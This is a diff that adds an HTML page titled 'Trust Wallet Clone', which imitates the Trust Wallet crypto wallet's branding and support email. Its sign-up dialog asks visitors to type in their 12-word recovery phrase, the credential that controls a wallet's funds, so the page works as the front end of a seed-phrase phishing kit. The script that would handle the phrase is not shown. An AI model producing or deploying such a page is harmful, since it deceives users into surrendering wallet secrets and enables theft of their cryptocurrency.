@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet Clone</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <h1>Trust Wallet</h1>
+            <ul>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#security">Security</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <section id="hero">
+            <h2>Secure Crypto Wallet</h2>
+            <p>Manage your cryptocurrencies with ease and security.</p>
+            <button id="signup-btn">Sign Up</button>
+        </section>
+        <section id="features">
+            <h2>Features</h2>
+            <ul>
+                <li>Multi-Currency Support</li>
+                <li>Secure Transactions</li>
+                <li>Easy to Use</li>
+            </ul>
+        </section>
+        <section id="security">
+            <h2>Security</h2>
+            <p>Top-notch security to protect your digital assets.</p>
+        </section>
+        <section id="contact">
+            <h2>Contact Us</h2>
+            <p>Email: support@trustwallet.com</p>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2024 Trust Wallet Clone. All rights reserved.</p>
+    </footer>
+
+    <!-- Signup Dialog -->
+    <div id="signup-dialog" class="modal">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2>Sign Up</h2>
+            <form id="signup-form">
+                <label for="recovery-phrase">Enter your 12-word recovery phrase:</label>
+                <textarea id="recovery-phrase" name="recovery-phrase" rows="4" required></textarea>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="scripts.js"></script>
+</body>
+</html>
